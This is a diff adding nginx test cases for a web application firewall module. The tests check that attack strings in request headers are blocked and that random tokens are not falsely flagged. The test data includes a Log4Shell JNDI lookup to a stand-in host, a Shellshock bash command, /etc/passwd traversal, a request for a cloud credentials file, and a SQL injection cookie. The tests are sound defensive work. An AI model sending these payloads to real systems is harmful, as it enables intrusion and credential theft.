@@ -124,3 +124,95 @@ GET /t?x=%00
 --- error_log
 category=nullbyte
 --- error_code: 403
+
+=== TEST 14: Log4Shell in an arbitrary application header
+# Every header value gets template + shellshock coverage because applications
+# routinely log or CGI-export headers they do not understand.
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t
+--- more_headers
+X-Api-Version: ${jndi:ldap://evil/a}
+--- error_log
+category=template source=header
+--- error_code: 403
+
+=== TEST 15: Shellshock in an arbitrary CGI-exported header
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t
+--- more_headers
+X-Debug: () { :;}; /bin/bash -c id
+--- error_code: 403
+
+=== TEST 16: WebDAV Destination traversal gets the full ruleset
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t
+--- more_headers
+Destination: http://backend.example/a/../../etc/passwd
+--- error_log
+category=traversal source=header
+--- error_code: 403
+
+=== TEST 17: reverse-proxy URI override gets the full ruleset
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t
+--- more_headers
+X-Original-URL: /.config/gcloud/application_default_credentials.json
+--- error_code: 403
+
+=== TEST 18: SQL injection in a Cookie value
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t
+--- more_headers
+Cookie: session=ok; preference=1 union select password from users
+--- error_code: 403
+
+=== TEST 19: opaque Cookie values do not run short-token categories
+# ro0ab is Java stream magic and p0wny is a webshell name. Both are only five
+# bytes, so running those categories over random session IDs would eventually
+# false-positive at scale.
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t
+--- more_headers
+Cookie: session=rO0ABp0wny
+--- error_code: 200
+
+=== TEST 20: opaque Authorization values only get punctuation-rich checks
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t
+--- more_headers
+Authorization: Bearer rO0ABp0wny
+--- error_code: 200
+
+=== TEST 21: shield_skip applies to generic-header coverage
+--- config
+    location /t { shield block; shield_skip template; empty_gif; }
+--- request
+GET /t
+--- more_headers
+X-Api-Version: ${jndi:ldap://evil/a}
+--- error_code: 200
+
+=== TEST 22: random multipart Content-Type boundaries avoid short-token categories
+# Content-Type must retain Struts coverage (TEST 4) without interpreting an
+# opaque boundary as Java stream magic or a webshell name.
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+POST /t
+--- more_headers
+Content-Type: multipart/form-data; boundary=rO0ABp0wny
+--- error_code: 405
